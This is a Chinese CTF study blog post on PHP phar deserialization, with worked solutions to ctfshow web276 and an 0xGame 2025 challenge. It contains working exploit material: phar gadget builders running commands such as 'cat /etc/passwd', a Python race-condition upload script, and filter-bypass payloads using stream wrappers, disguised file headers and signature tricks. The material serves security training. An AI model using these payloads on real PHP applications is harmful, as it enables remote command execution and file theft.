---
title: phar 反序列化
date: 2026-08-15 11:10:00
categories:
  - Web安全
tags:
  - PHP
  - phar
  - 反序列化
description: phar 反序列化
---

[PHP Phar反序列化总结_ctf phpphar反序列化-CSDN博客](https://blog.csdn.net/q20010619/article/details/120833148)

[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

[浅析Phar反序列化 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/305292.html)

[php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客](https://blog.csdn.net/MrWangisgoodboy/article/details/130146658)

# Phar反序列化

#### Phar文件结构

phar文件是php里类似于JAR的一种打包文件本质上是一种**压缩文件**，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分。

```
[Stub] + [Manifest] + [File Contents] + [Signature]
```

1.a stub
    可以理解为一个标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();`来结尾，否则phar扩展将无法识别这个文件为phar文件**(注意绕过)**
2.a **manifest** describing the contents

- **Manifest** 是 Phar 文件格式中的一个核心部分，它相当于 Phar 文件的"目录"或"元数据索引"。

​	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的`meta-data`，这是上述攻击手法最**核心**的地方
3.the file contents
​    被压缩文件的内容
4.[optional] a signature for verifying Phar integrity (phar file format only)
​	签名，放在文件末尾

#### 生成phar文件

php内置了一个Phar类来处理相关操作

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件

**实操一下：**

kali 写一个2.php文件，内容如上

运行后边生成phar.phar文件

![image-20251208145339444](/img/ctf/phar-deserialization-001.png)

访问之后会在同目录生成 phar.phar 文件，xxd 命令查看文件结构

![image-20251113200156232](/img/ctf/phar-deserialization-002.png)

meta-data是以序列化的形式存储的

php一大部分的文件系统函数在通过`phar://伪协议`解析phar文件时，都会将`meta-data`进行反序列化，测试后受影响的函数如下：

##### 🔴phar可用魔术方法

![image-20251208145352497](/img/ctf/phar-deserialization-003.png)

测试脚本：

```php
<?php
class TestObject {
    public function __destruct() {
        echo 'Destruct called' . PHP_EOL;
    }
}

// 创建phar文件
$phar = new Phar('phar.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'This is test content');
$phar->setMetadata(new TestObject());
$phar->stopBuffering();

// 现在读取phar文件
echo "Reading phar file..." . PHP_EOL;
$content = file_get_contents('phar://phar.phar/test.txt');
echo "Content: " . $content . PHP_EOL;
?>
```

析构方法被调用，注意此处 weakup 等方法不会被调用

这样就可以在不调用unserialize()的情况下进行反序列化操作

![image-20251208145358157](/img/ctf/phar-deserialization-004.png)

参考文章：https://paper.seebug.org/680/

#### Phar协议文件包含

phar协议要求：

- php大于5.3.0
- 需要将php.ini的参数phar.readonly设置为off（kali已配置好了）

因为phar文件本质就是以中`压缩文件`，所以可以使用phar伪协议读取执行

很多网站都采用单一入口模式来作为网站文件加载模式

```php
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include($action.'.php'); //载入相应文件
?>
```

此处就存在文件包含漏洞，可以利用伪协议读取文件源码，但是只能访问php文件

![image-20251208145405785](/img/ctf/phar-deserialization-005.png)

首先写一个 test.php，写入要执行的命令

```php
<?php phpinfo();?>
```

将 `test.php` 压缩为 `test.zip` 注意：压缩时选择仅存储，在文件上传处上传 `test.zip` 文件

将 test.zip 文件后缀改为 jpg，上传 jpg 文件，在 url 中访问

✔️`index.php?doc=phar://upload_files/test.jpg/test.php`

```php
?r=phar://pic/test.jpg/test
```

![image-20251208145410706](/img/ctf/phar-deserialization-006.png)

不仅可以使用phar协议，zip协议也是可以的

#### zip文件包含

和phar用法，不同效果一致

```php
include($file.'.jpg');
## \x00的截断在php<5.3.4you'xi
```

将php文件后缀改为jpg（因为是include .jpg），然后用压缩软件压缩为 zip格式，再将 zip 文件后缀名改为 jpg（绕过限制方便图片上传）

```php
/?r=zip://pic/test4.jpg%23test

##pic是图片保存目录
```

这个例子只是利用了phar伪协议解析文件，并没有利用反序列化

# Phar反序列化漏洞利用

#### **漏洞利用条件**

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤

###### ✔️例题：ctfshow web276 （phar反序列化+条件竞争）

打开得到源码

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');     //phar
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);    //phar
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}

where is flag?
```

发现可以通过 file_put_contents 写 phar 文件，然后题目中 file_put_contents 第一个参数可控，那么我们可以使用 phar:// 协议，通过 $content 传入 phar 数据，这样在 PHP 通过 phar:// 协议解析数据时，会将 `meta-data` （元数据）部分进行反序列化

不过题目会删除文件，所以需要在删除文件前执行文件进行以上操作，因此要用到***条件竞争***，即生成了 phar 文件，在极短时间内文件是存在的，因为执行到 `unlink 函数`前还有一个 `copy 文件操作`，`磁盘 io` （计算机的输入/输出操作）是需要一定时间的。只要我们不断在`写入 phar 文件`，那么这个文件就可以断断续续访问到phar构造如下，会在当前目录生成 `evil.phar 文件`

可利用条件竞争的代码详解：

```php
if($f->checkevil()===false){
    file_put_contents($_GET['fn'], $content);
    copy($_GET['fn'],md5(mt_rand()).'.txt');
    unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
    echo 'work done';
}
```

- `file_put_contents($_GET['fn'], $content);`：将用户控制的内容写入到文件名由`$_GET['fn']`指定的文件中。
- `copy($_GET['fn'],md5(mt_rand()).'.txt');`：将刚写入的文件复制到一个随机名称的新文件中。
- `unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);`：立即删除原始文件（位于Web根目录下）。

这个操作序列创建了一个非常短的时间窗口：文件被写入后，在`unlink`删除之前，文件短暂存在。攻击者需要在这个时间窗口内通过phar协议访问该文件，以触发phar反序列化漏洞。如果攻击者能在此期间成功访问文件，就能执行反序列化后的恶意代码；否则，文件会被删除，攻击失败。因此，条件竞争是利用此漏洞的关键。

补充：**条件竞争是什么？**

条件竞争（Race Condition）是一种并发编程中的漏洞，当两个或多个进程或线程同时访问共享资源（如文件、数据等）时，最终结果取决于它们执行的相对时序。在Web安全中，攻击者可以利用条件竞争在某个短暂的时间窗口内执行本应被限制的操作，例如在文件被创建但被删除前访问它。

4.php:

```php
<?php
class filter 
{
    public $filename = ';cat fl*';
    public $evilfile = true;
    public $admin = true;
}

// 后缀必须为phar
$phar = new Phar("evil.phar");
$phar->startBuffering();
// 设置 stubb
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new filter();
/**
 * 将自定义的 meta-data 存入 manifest
 * 这个函数需要在php.ini中修改 phar.readonly 为 Off
 * 否则的话会抛出 
 * creating archive "***.phar" disabled by the php.ini setting phar.readonly 
 * 异常.
 */
$phar->setMetadata($o);
// 添加需压缩的文件
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

运行4.php文件，生成evil.phar文件

![image-20251208145420945](/img/ctf/phar-deserialization-007.png)

条件竞争，py3脚本

```python
import base64
import requests
import threading

flag = False
url = 'ip'
data = open('./evil.phar', 'rb').read()

pre_resp = requests.get(url)
if pre_resp.status_code != 200:
    print(url + '\n链接好像挂了....')
    exit(1)

def upload():
    requests.post(url+"?fn=evil.phar", data=data)


def read():
    global flag
    r = requests.post(url+"?fn=phar://evil.phar/", data="")
    if "ctfshow{" in r.text and flag is False:
        print(base64.b64encode(r.text.encode()))
        flag = True

while flag is False:
    a = threading.Thread(target=upload)
    b = threading.Thread(target=read)
    a.start()
    b.start()
```

# 绕过：

[php(phar)反序列化漏洞及各种绕过姿势_throw new 绕过php-CSDN博客](https://blog.csdn.net/MrWangisgoodboy/article/details/130146658)

#### 将phar伪造成其他格式的文件

如果文件上传界面后端代码会检查文件类型的话，就需要将 phar 文件未造成其他格式文件

```php
$_FILES["file"]["type"]=="image/gif"
```

由于php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过**添加任意的文件头+修改后缀名**的方式将phar文件伪装成其他格式的文件

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

#### 绕过phar关键字检测

在第一个实例中，文件成功上传之后使用 phar 伪协议去读取文件，但是如果后端检测参数不能以 phar 开头的话，就需要绕过

```php
if (preg_match("/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i",$filename){
    die();
}
```

绕过方法：

```php
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///home/sx/test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt

// 还可以使用伪协议的方法绕过
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

其中：`compress.bzip2://` 和 `compress.zlib://` 是 PHP 合法的流包装器，用于处理压缩数据。

（核心概念：流包装器

PHP 有一个非常强大的特性叫做“流包装器”。你可以把它理解为一种协议，用于告诉 PHP 如何访问不同的“资源”。我们最熟悉的是 `file://`（访问本地文件）和 `http://`（访问网络资源）。

`phar://` 也是一个流包装器，它专门用于读取 **PHAR** 文件，并在读取时自动反序列化其**元数据**。这正是 Phar 反序列化漏洞的根源。）

#### 绕过__HALT_COMPILER特征检测

```php
if (preg_match("/</?|php|HALT_COMPILER/i",$filename){
    die();
}
```

因为phar中的a stub字段必须以`__HALT_COMPILER();`字符串来结尾，否则phar扩展将无法识别这个文件为phar文件，所以这段字符串不能省略，只能绕过

方法一：

首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）
![image-20251208145450172](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251208145450172.png)

文件上传成功后，利用文件包含漏洞包含文件

```php
file_un.php?filename=phar://pic/phar.phar.gz/phar.phar
# file_un.php中包含__destruct并且可以被触发
```

**方法二**

将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则

```php
$phar_file = serialize($exp);
    echo $phar_file;
    $zip = new ZipArchive();
    $res = $zip->open('1.zip',ZipArchive::CREATE); 
    $zip->addFromString('crispr.txt', 'file content goes here');
    $zip->setArchiveComment($phar_file);
    $zip->close();
```

phar反序列化过程中，对metadata进行解析的时候会进行`php_var_unserialize()`将Phar中的metadata进行反序列化

![image-20251208145444636](/img/ctf/phar-deserialization-009.png)

[从一道题再看phar的利用-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/240007#h2-5)

#### **phar 文件签名修改**

1.签名结构

```c
struct phar_signature {
    int signature_type;    // 签名算法类型
    char *signature;       // 签名数据
    int signature_length;  // 签名长度
    int flags;             // 标志位
};
```

```
签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1

其中末尾的4个字节是固定的, 表示该文件存在签名

倒数第8~4个字节表示文件使用的签名算法

倒数8个字节往前就是签名的二进制值, 对文件开头到声明签名部分以前的内容进行计算, 长度视算法类型而定
```

2.核心思路

当 PHP 遇到**无效签名**时，默认行为是：

1. 检测到签名不匹配
2. **抛出警告** (Warning)
3. **但继续执行** Phar 文件的解析和反序列化

**关键点**：签名错误不会阻止反序列化执行！

以 SHA1 为例

在修改了 phar 数据后, 我们需要更改的就是这部分 (20字节长度) 的内容

![image-20251208145457526](/img/ctf/phar-deserialization-010.png)

脚本，以默认的sha1签名为例：

```php
from hashlib import sha1
with open('phar.phar', 'rb') as file:
    f = file.read()     # 修改内容后的phar文件,以二进制文件形式打开

s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）
h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节
newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)

with open('newPhar.phar', 'wb') as file:
    file.write(newf) # 写入新文件
```

**实例**:

场景：文件上传 + Phar 反序列化

```php
// 漏洞代码
if(isset($_FILES['file'])){
    $upload_file = 'uploads/'.$_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $upload_file);
    
    // 这里会触发phar反序列化，但忽略签名错误
    file_get_contents("phar://".$upload_file);
}
```

攻击步骤：

1. **准备恶意 Phar**：

```php
class Exploit {
    public $cmd = 'system("cat /etc/passwd")';
    function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('exploit.phar');
$phar->addFromString('test.txt', 'text');
$phar->setMetadata(new Exploit());
$phar->setStub('<?php __HALT_COMPILER(); ?>');
```

​           2.**修改 payload**：

```php
# kali中使用十六进制编辑器修改 metadata 中的命令

# 将二进制文件转换为十六进制文本
xxd exploit.phar > exploit.hex
# 使用 vim 编辑
vim exploit.hex
# 编辑完成后转换回二进制
xxd -r exploit.hex > exploit_modified.phar
```

​           3.**上传并触发**：

```php
// 上传修改后的 exploit.phar
// 访问触发页面，虽然会有警告，但命令已执行
```

#### 使用 tar 绕过签名

phar 协议对 tar 的处理跟 gzip bzip2 这些不太一样

对 gzip bzip2 处理时, PHP 会将其解压缩, 然后解析里面的 phar 文件

而对 tar 处理时, PHP 会检测压缩包中是否存在 `.phar/.metadata`, 存在的话就会将 .metadata 里的内容**直接进行反序列化**

------

**传统 Phar 流程**：

```
phar://malicious.phar → 验证签名 → 解析manifest → 反序列化metadata
```

**Tar 绕过流程**：

```
phar://malicious.tar → 按tar格式解析 → 查找.phar/.metadata → 直接反序列化
```

**关键区别**：tar 格式的处理跳过了 Phar 签名验证步骤！

------

测试代码

```php
<?php

class A{
    public $text = 'test';
    function __destruct(){
        echo $this->text;
    }

    function __wakeup(){
        $this->text = 'fail';
    }
}

file_get_contents($_GET['a']);

?>
```

本地创建 .phar 文件夹和 .metadata 文件

```bash
exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ ls -a
.metadata
exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ cat .metadata
O:1:"A":2:{s:4:"text";s:7:"success";}
```

tar 压缩, **必须是 Linux 环境**

```bash
tar -cf phar.tar .phar/
```

访问 `index.php?a=phar://phar.tar`

![image-20251208145513184](/img/ctf/phar-deserialization-011.png)

# ✔️**例题：[0xGame_2025]文件查询器（蓝）**

## （`file_get_contents`触发phar反序列化）

在文件查询中查询index.php，base64编码，解码得到源码

```php
<?php
error_rporting(0);
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM
    public function __construct()
    {
      $this -> ZombiegalKawaii();
    }
    
    public function ZombiegalKawaii()
    {
      $HG2 = $this -> HG2;
      if(preg_match("/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i",$HG2))
      {
        die("这这这你也该绕过去了吧");
      }
      else{
        $this -> ToT = "这其实是来占位的";

      }
    }

    public function __destruct()
    {
      $HG2 = $this -> HG2;
      $FM2tM = $this -> FM2tM;
      echo "Wow";
      var_dump($HG2($FM2tM));
    }
}

$file=$_POST['file'];
if(isset($_POST['file']))
{
    if (preg_match("/'[\$%&#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|<|>/i", $file))
    {
        die("对方撤回了一个请求，并企图萌混过关");
    }
    echo base64_encode(file_get_contents($file));
}
```

因为是文件上传，再查询upload.php，获得文件上传的代码

```php
<?php
error_reporting(0);
$White_List = array("jpg", "png", "pdf");
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
if (($_FILES["file"]["size"] && in_array($extension, $White_List)))
{   
    //file_get_contents触发phar反序列化
    $content=file_get_contents($_FILES["file"]["tmp_name"]);
    $pos = strpos($content, "__HALT_COMPILER();");
    if(gettype($pos)==="integer")
    {
        die("你猜我想让你干什么喵");
    }
    else
    {
        if (file_exists("./upload/" . $_FILES["file"]["name"]))
        {
            echo $_FILES["file"]["name"] . " Already exists. ";
        }
        else
        { 
            $file = fopen("./upload/".$_FILES["file"]["name"], "w");
            fwrite($file, $content); 
            fclose($file);
            echo "Success ./upload/".$_FILES["file"]["name"];
        }
    }
}
else
{ 
    echo "请重新尝试喵"; 
} 
?>
```

file_get_contents触发phar反序列化,gz压一下，改一下文件名分别绕过内容waf和文件名waf

1. ***\*生成恶意的序列化MaHaYu对象\****：创建一个MaHaYu对象，其中`$HG2`设置为`getenv`（用于读取环境变量），`$FM2tM`设置为`FLAG`（假设flag存储在环境变量FLAG中）。序列化该对象。
2. ***\*创建phar文件\****：将序列化对象作为元数据嵌入到phar文件中。
3. ***\*压缩phar文件\****：将phar文件压缩为.gz格式，以避免upload.php检测到`__HALT_COMPILER();`字符串。
4. ***\*上传压缩文件\****：将压缩后的phar文件上传为jpg文件，通过upload.php。
5. ***\*触发反序列化\****：通过index.php的file参数，使用phar协议访问上传的文件，触发反序列化，从而执行getenv("FLAG")获取flag。

```php
<?php
error_reporting(0);
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM;
    public function __construct()
    {
      $this -> ZombiegalKawaii();
    }
    
    public function ZombiegalKawaii()
    {
      $HG2 = $this -> HG2;
      if(preg_match("/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i",$HG2))
      {
        die("这这这你也该绕过去了吧");
      }
      else{
        $this -> ToT = "这其实是来自各位的";
 
      }
    }
 
    public function __destruct()
    {
      $HG2 = $this -> HG2;
      $FM2tM = $this -> FM2tM;
      echo "Wow";
      var_dump($HG2($FM2tM));
    }
}
$a = new MaHaYu();
$a -> HG2 = "getenv";
$a->FM2tM="FLAG";    //本来用glob发现根目录无flag，直接看环境就好了
 
 
$phar = new Phar("2.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>'); //固定的
$phar->setMetadata($a);
$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名，添加要压缩的文件
$phar->stopBuffering();
 
$fp = gzopen("2.phar.gz", 'w9');
gzwrite($fp, file_get_contents("2.phar"));
gzclose($fp);
 
// 将 2.phar.gz 重命名为 2.phar.png
@rename("2.phar.gz", "1.phar.png");
?>
```

将代码保存到1.php里，在kali里运行，生成1.phar.png和2.phar文件

![image-20251208145520875](/img/ctf/phar-deserialization-012.png)

回到文件上传，上传生成的1.phar.php文件

然后打phar协议就好了

```
phar://upload/1.phar.png
```

![image-20251208145542237](../../AppData/Roaming/Typora/typora-user-images/image-20251208145542237.png)

0xGame{Y0u_Are_Rea11y_a_Ph4r_G0d!}



## 相关习题：

[CISCN2019 华北赛区 Day1 Web1]Dropbox

[[CISCN2019 华北赛区 Day1 Web1\]Dropbox复现_51CTO博客_[ciscn2019 华北赛区 day1 web1]dropbox](https://blog.51cto.com/u_15127625/3544477)



## Gzip 和 Bzip2：压缩算法

在 PHP 流包装器中的对应关系

PHP 提供了对应的流包装器来处理这些压缩格式：

| 压缩格式  | PHP 流包装器        |
| :-------- | :------------------ |
| **Gzip**  | `compress.zlib://`  |
| **Bzip2** | `compress.bzip2://` |

技术细节对比

```php
// Gzip 压缩流
compress.zlib://file.gz
compress.zlib://phar:///test.phar/test.txt

// Bzip2 压缩流  
compress.bzip2://file.bz2
compress.bzip2://phar:///test.phar/test.txt
```

在 Phar 反序列化绕过中的应用

在绕过场景中，两者的作用是**完全相同**的：

```php
// 两种方式都能达到同样的绕过效果
compress.zlib://phar:///malicious.phar/test.txt
compress.bzip2://phar:///malicious.phar/test.txt
```



